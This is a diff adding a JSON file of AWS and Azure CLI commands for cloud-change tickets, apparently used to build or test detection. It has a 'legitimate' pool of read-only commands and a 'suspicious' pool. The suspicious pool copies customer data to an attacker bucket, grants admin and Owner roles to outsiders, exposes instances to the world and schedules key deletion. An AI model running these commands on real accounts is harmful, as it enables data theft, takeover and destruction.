@@ -1,0 +1,19 @@
+{
+  "_doc": "Cloud (AWS / Azure CLI) command pools for cloud_resource_change tickets.",
+  "legitimate": [
+    "aws ec2 describe-instances --instance-ids i-0abcd1234 --region ap-southeast-2",
+    "aws s3 ls s3://audit-logs/ --region ap-southeast-2",
+    "aws kms describe-key --key-id alias/payments --region ap-southeast-2",
+    "aws iam get-role --role-name role-deployer",
+    "az vm show --resource-group rg-finance --name vm-finance-app-01",
+    "az keyvault secret show --vault-name keyvault-finance --name db-password",
+    "aws cloudtrail lookup-events --max-results 10 --region ap-southeast-2"
+  ],
+  "suspicious": [
+    "aws s3 sync s3://customer-exports/ s3://attacker-controlled-bucket/",
+    "aws iam attach-role-policy --role-name role-deployer --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+    "aws ec2 modify-instance-attribute --instance-id i-0abcd1234 --groups sg-open-to-world",
+    "az role assignment create --role Owner --assignee attacker@external.com --scope /subscriptions/xxxx",
+    "aws kms schedule-key-deletion --key-id alias/payments --pending-window-in-days 7"
+  ]
+}
